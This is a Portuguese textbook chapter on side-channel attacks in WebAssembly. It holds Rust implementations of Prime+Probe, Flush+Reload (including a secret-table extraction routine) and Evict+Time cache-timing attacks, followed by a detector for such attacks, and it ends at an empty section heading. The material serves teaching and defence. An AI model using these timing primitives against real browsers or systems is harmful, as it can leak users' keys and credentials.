# Capítulo 10: Side-Channels em WebAssembly

## 10.1 Introdução a Side-Channels em Wasm

Side-channel attacks representam uma das categorias mais insidiosas de vulnerabilidades em sistemas computacionais. Diferentemente de ataques que exploram bugs no código (como buffer overflows ou SQL injection), ataques por side-channel exploram informações indiretas — como tempo de execução, consumo de energia, padrões de acesso a cache, ou até mesmo ruído eletromagnético — para extrair dados sensíveis que o software deveria manter secreto.

Em WebAssembly, side-channel attacks ganham uma dimensão particularmente preocupante. O modelo de execução do Wasm, que combina execução via JIT compilation no navegador com acesso compartilhado a hardware de cache e predição de branches, cria uma superfície de ataque rica e multifacetada.

### 10.1.1 O que São Ataques por Side-Channel

Um side-channel attack é qualquer técnica que obtém informações de um sistema através de canais de comunicação não intencionais. O sistema alvo realiza operações legítimas, mas essas operações produzem efeitos colaterais mensuráveis que um adversário pode observar e analisar.

```
+------------------------------------------------------------------+
|                    MODELO DE SIDE-CHANNEL                         |
+------------------------------------------------------------------+
|                                                                  |
|  +----------------+     Operação      +----------------+         |
|  |   APLICATIVO   | ----------------> |    HARDWARE     |        |
|  |  (Wasm Module) |                    |  (CPU, Cache)   |        |
|  +----------------+                    +----------------+         |
|         |                                      |                 |
|         | Dado secreto                        | Efeitos colaterais |
|         | (chave, senha)                      | (tempo, cache,    |
|         |                                      |  branches)        |
|         v                                      v                 |
|  +----------------+                    +----------------+         |
|  |   ADVERSÁRIO   | <=== Monitora ==== |  SIDE CHANNEL   |       |
|  |                |                    |  (tempo/cache)  |        |
|  +----------------+                    +----------------+         |
|                                                                  |
|  O adversário NÃO acessa o dado diretamente.                    |
|  Ele observa efeitos colaterais da operação.                    |
+------------------------------------------------------------------+
```

Os principais tipos de side-channel incluem:

**Canais temporais (timing)**: O tempo necessário para uma operação revela informações. Por exemplo, uma comparação de strings que retorna na primeira diferença revela, pelo tempo de execução, quantos caracteres estão corretos.

**Canais de cache**: O padrão de hits e misses no cache do processador reflete padrões de acesso a memória, que por sua vez refletem dados sendo processados.

**Canais de branch prediction**: O preditor de branches do CPU registra padrões de desvios condicionais, que podem revelar caminhos de execução tomados em funções que processam dados secretos.

**Canais de功耗 (power analysis)**: O consumo de energia varia conforme as operações realizadas pelo processador.

**Canais acústicos e eletromagnéticos**: Variações no som emitido por componentes ou radiação eletromagnética podem revelar operações internas.

### 10.1.2 Por Que WebAssembly É Particularmente Vulnerável

WebAssembly, apesar de ter sido projetado com foco em segurança do sandbox, apresenta características que o tornam especialmente suscetível a side-channel attacks:

**JIT Compilation no Navegador**: Diferente de binários nativos, módulos Wasm são compilados por um compilador JIT (Just-In-Time) no navegador. O processo de compilação JIT introduz otimizações que podem criar gadgets de speculative execution — exatamente o tipo de código que ataques Spectre exploram.

```
+------------------------------------------------------------------+
|              PIPELINE DE COMPILAÇÃO WASM                         |
+------------------------------------------------------------------+
|                                                                  |
|  [Wasm Binary] --> [Decoder] --> [IR] --> [Optimize] --> [JIT]  |
|       |               |           |          |            |      |
|       v               v           v          v            v      |
|  Bytecode      Validacão    Otimizacão   Especifico   Native   |
|  original      de tipos     aggressive   da plataforma  code    |
|                                                                  |
|  Pontos onde side-channels podem ser introduzidos:               |
|  * Otimizações removem verificações de limites                   |
|  * Aliasing permite acessos a memória impróprios                 |
|  * Branch prediction hints criam gadgets Spectre                 |
|  * Inlining expõe padrões de acesso a memória                   |
+------------------------------------------------------------------+
```

**Memória Compartilhada via SharedArrayBuffer**: Wasm frequentemente usa SharedArrayBuffer para comunicação entre threads (Web Workers). Esse mecanismo de compartilhamento pode ser explorado como um canal de alta resolução para medição de tempo.

**Modelo de Memória Linear**: A memória linear do Wasm, embora isolada do hospedeiro, compartilha a mesmacache de hardware com outros módulos e com o próprio navegador. Isso permite ataques cross-module via cache.

**Tabela de Funções Indiretas**: O mecanismo de call indireto do Wasm (usado para dispatch de funções via table) interage diretamente com o preditor de branches, criando vetores para branch target injection.

**Execução em Contexto Privilegiado**: Módulos Wasm frequentemente executam operações sensíveis — criptografia, autenticação, processamento de dados financeiros — em um contexto onde um timing leak pode ter consequências reais.

### 10.1.3 Superfície de Ataque: Visão Geral

A superfície de ataque para side-channels em Wasm pode ser organizada em camadas:

```
+------------------------------------------------------------------+
|                SUPERFÍCIE DE ATAQUE WASM                         |
+------------------------------------------------------------------+
|                                                                  |
|  CAMADA 7: APLICAÇÃO                                             |
|  +------------------------------------------------------------+  |
|  | Lógica de negócio que processa dados sensíveis             |  |
|  | Algoritmos com branches condicionais baseados em input     |  |
|  | Tabelas de lookup baseadas em dados secretos               |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 6: COMPILADOR WASM                                      |
|  +------------------------------------------------------------+  |
|  | Otimizações que eliminam checks de segurança               |  |
|  | Inlining que expõe padrões de memória                      |  |
|  | Geração de código com gadgets Spectre                      |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 5: RUNTIME DO NAVEGADOR                                 |
|  +------------------------------------------------------------+  |
|  | Gerenciamento de memória e garbage collection              |  |
|  | Scheduling de JIT compilation                              |  |
|  | Gerenciamento de Worker threads                            |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 4: SISTEMA OPERACIONAL                                  |
|  +------------------------------------------------------------+  |
|  | Gerenciamento de processos e threads                       |  |
|  | Controle de acesso a SharedArrayBuffer                      |  |
|  | Mitigações de kernel (KPTI, retpoline)                     |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 3: HARDWARE                                             |
|  +------------------------------------------------------------+  |
|  | Cache hierarchy (L1, L2, L3)                               |  |
|  | Branch predictor (BTB, RSB, etc.)                          |  |
|  | Out-of-order execution engine                              |  |
|  | Speculative execution                                       |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

### 10.1.4 Taxonomia de Side-Channels em Wasm

Podemos classificar os side-channel attacks em Wasm segundo diversas dimensões:

**Por canal de observação**:

| Canal | Mecanismo de Observação | Resolução | Viabilidade em Wasm |
|-------|------------------------|-----------|---------------------|
| Timing | `performance.now()` | ~1-5μs | Alta |
| Cache | Eviction time patterns | ~100ns | Alta (via SharedArrayBuffer) |
| Branch | BTB state | ~10ns | Média |
| Power | Hardware counters | N/A | Baixa (navegador não expõe) |
| Memory | Allocation patterns | ~1μs | Média |

**Por tipo de speculative execution**:

| Tipo | Descrição | Gadget em Wasm |
|------|-----------|----------------|
| Spectre v1 | Bounds check bypass | Verificações de limites removidas pelo JIT |
| Spectre v2 | Branch target injection | Tabelas de chamadas indiretas |
| Spectre v3 | Meltdown | Acesso a memória kernel (mitigado no SO) |
| Spectre v3a | Rogue data cache load | Acesso a endereços especiais |
| Spectre v4 | Speculative store bypass | Loads especulativos após stores |
| Spectre-RSB | Return stack buffer | Retornos de funções Wasm |

**Por superfície de exploração**:

- **Intra-module**: Ataque entre funções dentro do mesmo módulo Wasm
- **Inter-module**: Ataque entre módulos Wasm diferentes no mesmo thread
- **Cross-origin**: Ataque entre origens diferentes usando Wasm como veículo
- **Browser-mediated**: Ataque que usa características do navegador (JIT, GC) como canal

**Por alvo**:

- **Chaves de criptografia**: Extração de chaves secretas via timing ou cache
- **Dados de autenticação**: Tokens, senhas, certificados
- **Dados financeiros**: Valores de transações, números de contas
- **Informações pessoais**: Dados sensíveis processados pelo módulo Wasm
- **Dados proprietários**: Algoritmos e lógica de negócio

## 10.2 Cache-Timing Attacks em Wasm

Cache-timing attacks são uma das categorias mais práticas e bem documentadas de side-channel attacks. Elas exploram o fato de que acessos a dados que estão no cache do processador são significativamente mais rápidos que acessos a dados que precisam ser buscados da memória principal.

### 10.2.1 Fundamentos de Arquitetura de Cache

Para entender como ataques de cache funcionam em Wasm, é necessário primeiro compreender a hierarquia de cache de um processador moderno.

```
+------------------------------------------------------------------+
|              HIERARQUIA DE CACHE DO PROCESSADOR                   |
+------------------------------------------------------------------+
|                                                                  |
|                        +-----------+                             |
|                        |    CPU    |                             |
|                        |  Core 0   |                             |
|                        +-----+-----+                             |
|                              |                                   |
|                     +--------+--------+                          |
|                     |   L1 Cache      |                          |
|                     |   (32-64 KB)    |                          |
|                     |   ~4 cycles     |                          |
|                     +--------+--------+                          |
|                              |                                   |
|                     +--------+--------+                          |
|                     |   L2 Cache      |                          |
|                     |   (256KB-1MB)   |                          |
|                     |   ~12 cycles    |                          |
|                     +--------+--------+                          |
|                              |                                   |
|         +--------------------+--------------------+              |
|         |                    |                    |              |
|  +------+------+    +------+------+    +------+------+          |
|  |   L3 Cache   |    |   L3 Cache   |    |   L3 Cache   |       |
|  |  (8-32 MB)   |    |  (8-32 MB)   |    |  (8-32 MB)   |       |
|  |  ~40 cycles  |    |  ~40 cycles  |    |  ~40 cycles  |       |
|  +------+------+    +------+------+    +------+------+          |
|         |                    |                    |              |
|         +--------------------+--------------------+              |
|                              |                                   |
|                     +--------+--------+                          |
|                     |   Main Memory   |                          |
|                     |   (8-64 GB)     |                          |
|                     |   ~200 cycles   |                          |
|                     +-----------------+                          |
+------------------------------------------------------------------+
```

**Linhas de cache (cache lines)**: A unidade mínima de transferência entre a memória e o cache. Tipicamente 64 bytes em processadores x86-64. Quando um byte é acessado, toda a linha de cache (64 bytes) é carregada.

**Conjuntos de cache (cache sets)**: O cache é organizado em conjuntos. O número de conjuntos determina a mapeamento de endereços para linhas de cache. Para um cache L1 de 32KB com 8-way set associativity e linhas de 64 bytes: 32768 / (8 * 64) = 64 conjuntos.

**Associatividade**: Define quantas linhas de cache um endereço pode ocupar. Em um cache de 8-way, cada conjunto tem 8 linhas onde o dado pode residir. Ataques de cache frequentemente exploram a associatividade limitada para forçar conflitos.

```c
// Estrutura conceitual de um cache de 8-way set associative
typedef struct {
    uint64_t tag;       // Tag do endereço
    uint8_t  data[64];  // Dados da linha (64 bytes)
    bool     valid;     // Bit de validade
    bool     dirty;     // Bit de sujeira (write-back)
} cache_line_t;

typedef struct {
    cache_line_t lines[8];  // 8 linhas por conjunto
} cache_set_t;

cache_set_t cache[64];     // 64 conjuntos para L1 de 32KB

// Mapeamento de endereço para conjunto:
// set_index = (address >> 6) & 0x3F  (6 bits para 64 conjuntos)
```

### 10.2.2 Ataque Prime+Probe em Wasm

O ataque Prime+Probe é um dos ataques de cache mais versáteis. Ele não requer shared memory entre o atacante e a vítima — apenas que ambos executem no mesmo processador e compartilhem o mesmo cache.

O ataque funciona em três fases:

```
+------------------------------------------------------------------+
|                   ATAKQUE PRIME+PROBE                             |
+------------------------------------------------------------------+
|                                                                  |
|  FASE 1: PRIME (Atacante preenche o cache)                       |
|  +------------------------------------------------------------+  |
|  |  for i in range(cache_sets):                               |  |
|  |      access(eviction_set[i])  // Preenche cada conjunto    |  |
|  +------------------------------------------------------------+  |
|                              |                                   |
|                              v                                   |
|  FASE 2: VÍTIMA EXECUTA (não controlada pelo atacante)          |
|  +------------------------------------------------------------+  |
|  |  // A vítima acessa seus dados, substituindo linhas do     |  |
|  |  // cache que o atacante havia preenchido                   |  |
|  |  result = process_secret_data(input)                       |  |
|  +------------------------------------------------------------+  |
|                              |                                   |
|                              v                                   |
|  FASE 3: PROBE (Atacante mede tempo de acesso)                  |
|  +------------------------------------------------------------+  |
|  |  for i in range(cache_sets):                               |  |
|  |      t1 = timestamp()                                      |  |
|  |      access(eviction_set[i])  // Tenta acessar             |  |
|  |      t2 = timestamp()                                      |  |
|  |      if (t2 - t1 > THRESHOLD):                             |  |
|  |          // Cache miss! A vítima acessou este conjunto     |  |
|  |          log("Set %d was used by victim", i)               |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

A implementação em Rust para Wasm do ataque Prime+Probe:

```rust
// Implementação de Prime+Probe para Wasm
// NOTA: Esta implementação é para fins educacionais apenas

use std::collections::HashMap;

// Tamanho típico de cache line em bytes
const CACHE_LINE_SIZE: usize = 64;

// Tamanho do buffer de eviction (ajustar conforme hardware)
const EVICTION_SIZE: usize = 8 * 1024 * 1024; // 8MB

// Estrutura para o ataque Prime+Probe
pub struct PrimeProbe {
    // Buffer grande para preencher o cache
    eviction_buffer: Vec<u8>,
    // Mapeamento de conjuntos de cache para offsets no buffer
    set_mapping: HashMap<usize, Vec<usize>>,
    // Número de conjuntos de cache alvo
    num_sets: usize,
}

impl PrimeProbe {
    pub fn new() -> Self {
        let mut eviction_buffer = vec![0u8; EVICTION_SIZE];
        // Inicializar buffer com dados não-zero para forçar cache fills
        for (i, byte) in eviction_buffer.iter_mut().enumerate() {
            *byte = (i % 256) as u8;
        }

        PrimeProbe {
            eviction_buffer,
            set_mapping: HashMap::new(),
            num_sets: 0,
        }
    }

    // Construir mapeamento de conjuntos de cache
    // Assume cache L1 de 32KB, 8-way, 64B lines -> 64 conjuntos
    pub fn build_set_mapping(&mut self, cache_sets: usize, associativity: usize) {
        self.num_sets = cache_sets;
        let lines_per_set = associativity;

        // Para cada conjunto, encontrar linhas de cache que mapeiam para ele
        for set_idx in 0..cache_sets {
            let mut set_lines = Vec::new();

            // Procurar offsets que mapeiam para este conjunto
            let mut count = 0;
            let mut offset = set_idx * CACHE_LINE_SIZE;

            while offset < EVICTION_SIZE && count < lines_per_set {
                set_lines.push(offset);
                // Avançar para a próxima linha que mapeia para o mesmo conjunto
                // Em um cache de 64KB com 64 conjuntos, linhas consecutivas
                // mapeiam para conjuntos diferentes
                offset += cache_sets * CACHE_LINE_SIZE;
                count += 1;
            }

            if !set_lines.is_empty() {
                self.set_mapping.insert(set_idx, set_lines);
            }
        }
    }

    // Fase PRIME: Preencher o cache com dados do atacante
    pub fn prime(&self) {
        for (_, offsets) in &self.set_mapping {
            for &offset in offsets {
                // Acesso para preencher a linha de cache
                unsafe {
                    let ptr = self.eviction_buffer.as_ptr().add(offset);
                    std::ptr::read_volatile(ptr);
                }
            }
        }
    }

    // Fase PROBE: Medir tempo de acesso para detectar que conjuntos foram usados
    pub fn probe(&self) -> Vec<(usize, u64)> {
        let mut results = Vec::new();

        for (set_idx, offsets) in &self.set_mapping {
            let mut total_time: u64 = 0;

            for &offset in offsets {
                let start = Self::rdtsc();
                unsafe {
                    let ptr = self.eviction_buffer.as_ptr().add(offset);
                    std::ptr::read_volatile(ptr);
                }
                let end = Self::rdtsc();
                total_time += end - start;
            }

            // Se o tempo total for maior que o limiar, houve cache miss
            // Isso indica que a vítima acessou este conjunto
            results.push((*set_idx, total_time));
        }

        results
    }

    // Leitura do timestamp counter (TSC)
    // Em Wasm, usamos performance.now() como alternativa
    fn rdtsc() -> u64 {
        // Em Wasm real, usaríamos performance.now()
        // Aqui usamos uma abstração
        #[cfg(target_arch = "wasm32")]
        {
            extern "C" {
                #[link_name = "performance_now"]
                fn perf_now() -> f64;
            }
            (unsafe { perf_now() } * 1_000_000.0) as u64
        }
        #[cfg(not(target_arch = "wasm32"))]
        {
            unsafe {
                let low: u32;
                let high: u32;
                std::arch::asm!(
                    "rdtsc",
                    out("eax") low,
                    out("edx") high,
                );
                ((high as u64) << 32) | (low as u64)
            }
        }
    }
}
```

### 10.2.3 Flush+Reload via Shared Memory

O ataque Flush+Reload é mais preciso que Prime+Probe, mas requer shared memory entre atacante e vítima. Em Wasm, isso é possível quando ambos os módulos compartilham o mesmo SharedArrayBuffer.

```
+------------------------------------------------------------------+
|                ATAKQUE FLUSH+RELOAD                               |
+------------------------------------------------------------------+
|                                                                  |
|  PREMISSA: Atacante e vítima compartilham memória (SAB)          |
|                                                                  |
|  FASE 1: FLUSH (Atacante invalida linhas do cache)              |
|  +------------------------------------------------------------+  |
|  |  // Usar instrução clflush (ou equivalente)                |  |
|  |  for addr in shared_memory:                                |  |
|  |      clflush(addr)  // Invalida linha do cache             |  |
|  +------------------------------------------------------------+  |
|                              |                                   |
|                              v                                   |
|  FASE 2: VÍTIMA EXECUTA                                          |
|  +------------------------------------------------------------+  |
|  |  // Vítima acessa dados em shared_memory                   |  |
|  |  // Isso carrega as linhas no cache                         |  |
|  |  result = process(secret_data, shared_buffer)              |  |
|  +------------------------------------------------------------+  |
|                              |                                   |
|                              v                                   |
|  FASE 3: RELOAD (Atacante mede tempo de acesso)                 |
|  +------------------------------------------------------------+  |
|  |  for addr in shared_memory:                                |  |
|  |      t1 = timestamp()                                      |  |
|  |      access(addr)                                          |  |
|  |      t2 = timestamp()                                      |  |
|  |      if (t2 - t1 < THRESHOLD):                             |  |
|  |          // Cache hit! A vítima acessou este endereço      |  |
|  |          log("Address 0x%x accessed by victim", addr)      |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

Implementação do Flush+Reload em Wasm:

```rust
// Flush+Reload para Wasm usando SharedArrayBuffer
// Acesso a memória compartilhada via Atomics

// Tamanho da página de memória compartilhada
const SHARED_PAGE_SIZE: usize = 65536; // 64KB

// Número de páginas compartilhadas
const NUM_SHARED_PAGES: usize = 16;

// Estrutura do ataque Flush+Reload
pub struct FlushReload {
    // Ponteiro para a memória compartilhada
    shared_mem: *mut u8,
    // Número de linhas de cache no buffer compartilhado
    num_lines: usize,
    // Buffer de probe (para medição de tempo)
    probe_buffer: Vec<u8>,
}

impl FlushReload {
    pub fn new(shared_buffer: &mut [u8]) -> Self {
        FlushReload {
            shared_mem: shared_buffer.as_mut_ptr(),
            num_lines: shared_buffer.len() / 64, // 64 bytes por cache line
            probe_buffer: vec![0u8; 64],
        }
    }

    // Fase FLUSH: Invalidar todas as linhas de cache
    // Em Wasm, não temos acesso direto a clflush
    // Usamos a estratégia de acessar um buffer grande para evict
    pub fn flush(&self) {
        // Criar um buffer grande para forçar eviction
        let evict_size = 2 * 1024 * 1024; // 2MB
        let evict_buffer = vec![0u8; evict_size];

        // Acessar cada cache line do buffer de eviction
        for i in (0..evict_size).step_by(64) {
            unsafe {
                let ptr = evict_buffer.as_ptr().add(i);
                std::ptr::read_volatile(ptr);
            }
        }

        // Garantir que as linhas do buffer compartilhado foram evicted
        std::hint::black_box(&evict_buffer);
    }

    // Fase RELOAD: Medir tempo de acesso a cada linha
    pub fn reload(&self) -> Vec<(usize, u64, bool)> {
        let mut results = Vec::new();

        for i in 0..self.num_lines {
            let offset = i * 64;

            // Medir tempo de acesso
            let start = Self::get_timestamp();
            unsafe {
                let ptr = self.shared_mem.add(offset);
                std::ptr::read_volatile(ptr);
                // Ler mais bytes da mesma cache line
                for j in 1..64 {
                    std::ptr::read_volatile(ptr.add(j));
                }
            }
            let end = Self::get_timestamp();

            let is_hit = (end - start) < 100; // Limiar para cache hit
            results.push((i, end - start, is_hit));
        }

        results
    }

    // Análise: quais linhas foram acessadas pela vítima
    pub fn analyze(&self, results: &[(usize, u64, bool)]) -> Vec<usize> {
        results.iter()
            .filter(|(_, _, is_hit)| *is_hit)
            .map(|(line_idx, _, _)| *line_idx)
            .collect()
    }

    // Timestamp de alta resolução para Wasm
    fn get_timestamp() -> u64 {
        // Em Wasm, usar performance.now()
        // Converter para nanosegundos para melhor resolução
        extern "C" {
            #[link_name = "performance_now"]
            fn perf_now() -> f64;
        }
        (unsafe { perf_now() } * 1_000_000.0) as u64
    }
}

// Ataque completo: monitorar acesso a uma tabela de lookup secreta
pub fn attack_secret_table(
    shared_mem: &mut [u8],
    secret_table: &[u8],
    probe_indices: &[usize],
) -> Vec<u8> {
    let mut fr = FlushReload::new(shared_mem);
    let mut extracted = Vec::new();

    for &idx in probe_indices {
        // Preparar SharedArrayBuffer com índice como offset
        // A vítima usará secret_table[idx] como índice para acessar shared_mem
        shared_mem[0] = idx as u8;

        // FLUSH
        fr.flush();

        // Aqui a vítima executaria:
        // shared_mem[secret_table[idx] * 64] = 1;
        // Mas para o ataque, assumimos que a vítima já executou

        // RELOAD
        let results = fr.reload();
        let accessed = fr.analyze(&results);

        // Se alguma linha foi acessada, o índice da tabela corresponde
        if !accessed.is_empty() {
            extracted.push(accessed[0] as u8);
        }
    }

    extracted
}
```

### 10.2.4 Metodologia Evict+Time

O ataque Evict+Time é uma variante que mede o tempo total de uma operação da vítima, em vez de medir acessos individuais ao cache. Ele é mais robusto contra contra-medidas de hardware.

```
+------------------------------------------------------------------+
|                ATAKQUE EVICT+TIME                                 |
+------------------------------------------------------------------+
|                                                                  |
|  FASE 1: EVICT (Atacante remove dados específicos do cache)      |
|  +------------------------------------------------------------+  |
|  |  // Identificar quais linhas de cache contêm os dados     |  |
|  |  // alvo e forçar sua remoção                               |  |
|  |  for line in target_lines:                                 |  |
|  |      evict_from_cache(line)                                |  |
|  +------------------------------------------------------------+  |
|                              |                                   |
|                              v                                   |
|  FASE 2: VÍTIMA EXECUTA (medir tempo total)                     |
|  +------------------------------------------------------------+  |
|  |  t1 = timestamp()                                          |  |
|  |  result = victim_operation(input)                          |  |
|  |  t2 = timestamp()                                          |  |
|  |  elapsed = t2 - t1                                         |  |
|  +------------------------------------------------------------+  |
|                              |                                   |
|                              v                                   |
|  FASE 3: COMPARAÇÃO                                              |
|  +------------------------------------------------------------+  |
|  |  // Se a vítima acessou os dados alvo, o tempo será        |  |
|  |  // maior (porque causamos cache miss)                      |  |
|  |  if elapsed > baseline_time:                               |  |
|  |      // A vítima acessou o dado alvo                       |  |
|  |      evidence_of_access = true                             |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

Implementação do Evict+Time em Wasm:

```rust
// Evict+Time attack para Wasm
// Mide o tempo de uma operação da vítima após evictar linhas de cache

use std::time::Instant;

pub struct EvictTime {
    // Buffer para causar eviction
    eviction_buffer: Vec<u8>,
    // Número de iterações para medição confiável
    num_iterations: usize,
    // Limiar para distinguir cache hit de miss
    threshold_ns: u64,
}

impl EvictTime {
    pub fn new() -> Self {
        EvictTime {
            // Buffer grande para garantir eviction
            eviction_buffer: vec![0u8; 4 * 1024 * 1024], // 4MB
            num_iterations: 1000,
            threshold_ns: 100, // 100 nanosegundos
        }
    }

    // Evict: preencher o cache com dados não relacionados
    pub fn evict(&self) {
        // Acessar cada linha do buffer de eviction
        // Isso substitui as linhas de cache anteriores
        for offset in (0..self.eviction_buffer.len()).step_by(64) {
            unsafe {
                let ptr = self.eviction_buffer.as_ptr().add(offset);
                // Usar read_volatile para impedir otimização
                std::ptr::read_volatile(ptr);
            }
        }
        // Usar black_box para garantir que o compilador não otimize a operação
        std::hint::black_box(&self.eviction_buffer);
    }

    // Medir tempo de uma operação da vítima
    pub fn measure_victim_time<F>(&self, victim_fn: F) -> Vec<u64>
    where
        F: Fn(),
    {
        let mut timings = Vec::with_capacity(self.num_iterations);

        for _ in 0..self.num_iterations {
            // Fase 1: Evict
            self.evict();

            // Fase 2: Medir tempo da vítima
            let start = Instant::now();
            victim_fn();
            let elapsed = start.elapsed().as_nanos() as u64;

            timings.push(elapsed);
        }

        timings
    }

    // Calcular estatísticas das medições
    pub fn analyze(&self, timings: &[u64]) -> TimingAnalysis {
        let n = timings.len() as f64;
        let sum: u64 = timings.iter().sum();
        let mean = sum as f64 / n;

        let variance = timings.iter()
            .map(|&t| {
                let diff = t as f64 - mean;
                diff * diff
            })
            .sum::<f64>() / n;

        let std_dev = variance.sqrt();

        // Calcular mediana
        let mut sorted = timings.to_vec();
        sorted.sort_unstable();
        let median = if sorted.len() % 2 == 0 {
            (sorted[sorted.len() / 2 - 1] + sorted[sorted.len() / 2]) / 2
        } else {
            sorted[sorted.len() / 2]
        };

        TimingAnalysis {
            mean,
            std_dev,
            median,
            min: *sorted.first().unwrap_or(&0),
            max: *sorted.last().unwrap_or(&0),
            num_samples: timings.len(),
        }
    }

    // Comparar timing com e sem acesso a dados secretos
    pub fn detect_secret_access<F1, F2>(
        &self,
        with_secret: F1,
        without_secret: F2,
    ) -> bool
    where
        F1: Fn(),
        F2: Fn(),
    {
        let timings_with = self.measure_victim_time(with_secret);
        let timings_without = self.measure_victim_time(without_secret);

        let analysis_with = self.analyze(&timings_with);
        let analysis_without = self.analyze(&timings_without);

        // Se o tempo médio com acesso ao segredo for significativamente
        // diferente, há um timing leak
        let diff = (analysis_with.mean - analysis_without.mean).abs();
        let pooled_std = ((analysis_with.std_dev.powi(2) +
                          analysis_without.std_dev.powi(2)) / 2.0).sqrt();

        // Usar regra de ouro: diferença > 3 desvios padrão
        diff > 3.0 * pooled_std
    }
}

#[derive(Debug, Clone)]
pub struct TimingAnalysis {
    pub mean: f64,
    pub std_dev: f64,
    pub median: u64,
    pub min: u64,
    pub max: u64,
    pub num_samples: usize,
}

impl std::fmt::Display for TimingAnalysis {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "Timing Analysis: mean={:.2}ns, std_dev={:.2}ns, median={}ns, range=[{}-{}]ns, n={}",
            self.mean, self.std_dev, self.median, self.min, self.max, self.num_samples
        )
    }
}
```

### 10.2.5 Detecção de Cache Side-Channel em Wasm

A detecção de ataques de cache side-channel em Wasm requer monitoramento tanto do código quanto do comportamento em runtime. Existem várias abordagens para detectar padrões de acesso que indicam um ataque em progresso:

```rust
// Detector de cache side-channel attacks em Wasm
// Monitora padrões de acesso à memória que indicam ataques

use std::collections::VecDeque;
use std::collections::HashMap;

// Tamanho da janela de monitoramento
const MONITOR_WINDOW: usize = 1000;

// Número máximo de acessos por janela antes de alertar
const MAX_ACCESSES_PER_WINDOW: usize = 500;

// Número mínimo de acessos diferentes antes de alertar
const MIN_UNIQUE_LINES: usize = 100;

pub struct CacheAttackDetector {
    // Histórico de acessos recentes
    access_history: VecDeque<CacheAccess>,
    // Contagem de acessos por linha de cache
    line_access_count: HashMap<usize, usize>,
    // Janela de tempo atual
    current_window_start: u64,
    // Contagem de acessos na janela atual
    accesses_in_window: usize,
}

#[derive(Clone)]
struct CacheAccess {
    line_index: usize,
    timestamp: u64,
    is_write: bool,
}

impl CacheAttackDetector {
    pub fn new() -> Self {
        CacheAttackDetector {
            access_history: VecDeque::with_capacity(MONITOR_WINDOW),
            line_access_count: HashMap::new(),
            current_window_start: 0,
            accesses_in_window: 0,
        }
    }

    // Registrar um acesso à memória
    pub fn record_access(&mut self, address: usize, is_write: bool, timestamp: u64) {
        let line_index = address / 64; // 64 bytes por cache line

        let access = CacheAccess {
            line_index,
            timestamp,
            is_write,
        };

        // Adicionar ao histórico
        self.access_history.push_back(access);
        if self.access_history.len() > MONITOR_WINDOW {
            self.access_history.pop_front();
        }

        // Atualizar contagens
        *self.line_access_count.entry(line_index).or_insert(0) += 1;
        self.accesses_in_window += 1;

        // Verificar janela de tempo
        if timestamp - self.current_window_start > 1_000_000 { // 1ms
            self.current_window_start = timestamp;
            self.accesses_in_window = 0;
            self.line_access_count.clear();
        }
    }

    // Verificar se o padrão de acesso indica um ataque
    pub fn detect_attack(&self) -> AttackIndication {
        let mut indicators = Vec::new();

        // Indicador 1: Muitos acessos a linhas diferentes em pouco tempo
        // Isso é típico de Prime+Probe
        if self.line_access_count.len() > MIN_UNIQUE_LINES
            && self.accesses_in_window > MAX_ACCESSES_PER_WINDOW
        {
            indicators.push(Indicator::HighAccessRate {
                unique_lines: self.line_access_count.len(),
                total_accesses: self.accesses_in_window,
            });
        }

        // Indicador 2: Padrão de acesso sequencial com stride constante
        // Isso é típico de flush+reload
        if self.detect_sequential_pattern() {
            indicators.push(Indicator::SequentialAccessPattern);
        }

        // Indicador 3: Alternância entre flush e reload
        if self.detect_flush_reload_pattern() {
            indicators.push(Indicator::FlushReloadPattern);
        }

        // Indicador 4: Acesso a endereços alinhados a cache lines
        // com alta frequência
        if self.detect_aligned_access_pattern() {
            indicators.push(Indicator::AlignedAccessPattern);
        }

        AttackIndication {
            is_suspicious: !indicators.is_empty(),
            confidence: self.calculate_confidence(&indicators),
            indicators,
        }
    }

    // Detectar padrão sequencial (stride constante)
    fn detect_sequential_pattern(&self) -> bool {
        if self.access_history.len() < 10 {
            return false;
        }

        let recent: Vec<_> = self.access_history.iter().rev().take(10).collect();
        let mut strides = Vec::new();

        for i in 0..recent.len() - 1 {
            let stride = if recent[i].line_index > recent[i + 1].line_index {
                recent[i].line_index - recent[i + 1].line_index
            } else {
                recent[i + 1].line_index - recent[i].line_index
            };
            strides.push(stride);
        }

        // Verificar se os strides são consistentes
        let first_stride = strides[0];
        strides.iter().all(|&s| (s as i64 - first_stride as i64).abs() <= 1)
    }

    // Detectar padrão flush+reload
    fn detect_flush_reload_pattern(&self) -> bool {
        if self.access_history.len() < 5 {
            return false;
        }

        // Procurar por sequência: acesso ao mesmo endereço múltiplas vezes
        // com intervalos regulares
        let mut address_counts: HashMap<usize, usize> = HashMap::new();
        for access in &self.access_history {
            *address_counts.entry(access.line_index).or_insert(0) += 1;
        }

        // Se algum endereço é acessado muitas vezes, pode ser flush+reload
        address_counts.values().any(|&count| count > 5)
    }

    // Detectar acesso a endereços alinhados
    fn detect_aligned_access_pattern(&self) -> bool {
        if self.access_history.len() < 20 {
            return false;
        }

        // Verificar se os acessos são a linhas de cache específicas
        // (não a endereços arbitrários)
        let recent: Vec<_> = self.access_history.iter().rev().take(20).collect();
        let aligned_count = recent.iter()
            .filter(|a| a.line_index % 8 == 0) // Alinhado a 512 bytes
            .count();

        aligned_count > 15 // Mais de 75% alinhados
    }

    // Calcular confiança da detecção
    fn calculate_confidence(&self, indicators: &[Indicator]) -> f64 {
        let base_confidence = indicators.len() as f64 * 0.25;
        let volume_factor = (self.accesses_in_window as f64 / MAX_ACCESSES_PER_WINDOW as f64).min(1.0);

        (base_confidence * volume_factor).min(1.0)
    }
}

#[derive(Debug)]
pub enum Indicator {
    HighAccessRate {
        unique_lines: usize,
        total_accesses: usize,
    },
    SequentialAccessPattern,
    FlushReloadPattern,
    AlignedAccessPattern,
}

#[derive(Debug)]
pub struct AttackIndication {
    pub is_suspicious: bool,
    pub confidence: f64,
    pub indicators: Vec<Indicator>,
}
```

### 10.2.6 Exemplos Práticos de Cache Attack em Rust->Wasm

